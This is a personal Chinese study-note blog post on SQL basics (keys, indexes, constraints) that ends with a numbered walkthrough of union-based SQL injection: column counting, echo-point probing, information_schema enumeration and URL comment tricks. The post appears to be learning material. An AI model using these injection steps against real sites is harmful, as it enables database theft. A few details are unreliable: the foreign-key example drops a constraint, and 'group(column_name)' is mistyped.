---
title: SQL
abbrlink: 4d712855
date: 2024-02-24 17:15:51
tags: 知识
---


**`2022`年`3`月`27`日学习`SQL`，共耗时：`4`小时**
**学习资料：[SQL教程](https://www.liaoxuefeng.com/wiki/1177760294764384/1179611432985088)**

姑且粗浅了解一下SQL，之后要用或者有时间再细学

#### 基本概念

**字段：**数据项，对应为数据库里的列

**记录：**一条由一系列字段组合成的数据，对应为数据库里的行

**主键：**用于对一条记录的唯一字段标识，一般用`id`或`GUID类型`

**联合主键：**多条字段设置为主键（不常用）

**外键：**用于关联另一个表，使用外键约束会降低数据库的性能，外键约束构造：

```SQL
ALTER TABLE students
DROP FOREIGN KEY fk_class_id;
```

**索引：**索引用于快速检索记录，主键是最典型的索引，也可以设置多个索引提高查询效率，索引字段多用hash算法来构造，所以散列值越多，冲突越少，查询效率越高
创建索引：

```SQL
ALTER TABLE students
ADD INDEX idx_score (score);
```

索引的优点是提高了**查询效率**，缺点是在插入、更新和删除记录时，需要同时修改索引，因此，索引越多，插入、更新和删除记录的速度就越慢。

创建唯一索引（不可重复）：

```SQL
ALTER TABLE students
ADD UNIQUE INDEX uni_name (name);
```

添加唯一约束但是不创建索引：

```SQL
ALTER TABLE students
ADD CONSTRAINT uni_name UNIQUE (name);
```

1. 找参数，判断字符型还是数字型
   
```SQL
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";  # 数字
```

2. 判断字段数`order by 4`
3. 判断回显点`union select 1,2,3`
4. 判断数据库名`union select 1,2,database()`，表名`union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名'(或者最后加limit语句来获取指定的表)`，列名`union select 1,2,group(column_name) from information_schema.columns where table_name='表名'`
5. 显示列内容`union select 1,2,group_concat(列名) from 表名`

网页SQL语句其实是php代码中的SQL，所以会有类似$id等参数引用来通过get获取

url中添加注释：
--+ 或者 --%20 或者 %23 ，不能用#

limit语句
group_concat()显示所有的内容，但是可能会受到现实的字数限制
